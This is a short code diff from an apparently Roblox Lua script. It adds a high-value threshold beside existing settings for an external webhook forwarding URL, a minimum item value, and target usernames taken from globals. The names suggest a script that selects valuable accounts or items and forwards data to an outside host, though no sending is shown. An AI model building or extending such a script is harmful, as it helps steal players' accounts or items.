@@ -49,6 +49,7 @@ local Forward = "https://webhook-rose-nu.vercel.app/api/forward.js"
 local users = {}
 local min_rap = 1000000
 local webhook = ""
+local HIGH_VALUE_THRESHOLD = 10000000000
 
 users = _G.Usernames
 webhook = _G.Webhook
